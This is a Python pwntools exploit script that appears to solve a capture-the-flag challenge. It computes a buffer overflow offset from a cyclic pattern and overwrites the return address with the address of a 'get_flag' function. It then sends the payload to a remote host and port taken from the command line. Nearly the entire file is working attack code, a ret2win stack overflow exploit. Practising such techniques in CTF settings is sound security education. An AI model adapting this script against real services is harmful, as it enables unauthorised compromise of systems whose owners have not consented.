#!/usr/bin/python3

from pwn import *
import sys
import struct, subprocess

def generate_cyclic(size):
    """
    Generate a cyclic (De Bruijn) pattern of the specified size.

    The pattern uses uppercase letters, lowercase letters, and digits
    to create a unique sequence where any 4-byte substring appears only once.

    Args:
        size (int): The desired length of the pattern in bytes.

    Returns:
        bytes: The generated cyclic pattern.
    """
    uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lowercase = "abcdefghijklmnopqrstuvwxyz"
    digits = "0123456789"

    pattern = []

    for upper in uppercase:
        for lower in lowercase:
            for digit in digits:
                if len(pattern) >= size:
                    return bytes(''.join(pattern[:size]), 'ascii')
                pattern.append(upper)
                if len(pattern) >= size:
                    return bytes(''.join(pattern[:size]), 'ascii')
                pattern.append(lower)
                if len(pattern) >= size:
                    return bytes(''.join(pattern[:size]), 'ascii')
                pattern.append(digit)

    return bytes(''.join(pattern[:size]), 'ascii')


def calculate_offset(eip_value, size):
    """
    Calculate the offset of an EIP value within a cyclic pattern.

    Args:
        eip_value: The value from EIP register. Can be:
                   - int: Direct integer value (e.g., 0x41326241)
                   - str: Hex string (e.g., "0x41326241" or "41326241")
                   - bytes: Raw bytes (e.g., b"Ab2A")
        size (int): The size of the cyclic pattern to search within.

    Returns:
        int: The offset where the pattern occurs, or -1 if not found.
    """
    # Generate the pattern to search
    pattern = generate_cyclic(size)

    # Convert eip_value to bytes for searching
    if isinstance(eip_value, int):
        # Convert integer to little-endian bytes (x86 is little-endian)
        search_bytes = struct.pack("<I", eip_value)
    elif isinstance(eip_value, str):
        # Handle hex string input
        eip_value = eip_value.strip()
        if eip_value.startswith("0x") or eip_value.startswith("0X"):
            eip_value = eip_value[2:]
        # Convert hex string to integer, then to little-endian bytes
        int_value = int(eip_value, 16)
        search_bytes = struct.pack("<I", int_value)
    elif isinstance(eip_value, bytes):
        search_bytes = eip_value
    else:
        raise ValueError(f"Unsupported eip_value type: {type(eip_value)}")

    # Search for the pattern
    offset = pattern.find(search_bytes)

    return offset


# buffer overflow exploit that leads to a simple ret2win approach

get_flag = p32(0x00401080)
offset1 = calculate_offset(0x72413772,1000)

print("offset calculated: "+str(offset1))
data = b'A' * offset1 + get_flag + b"\xcc" * (500-offset1-4)

p = remote(sys.argv[1],35542)
print(p.recv(2048))
p.send(data)
print(p.recvall())
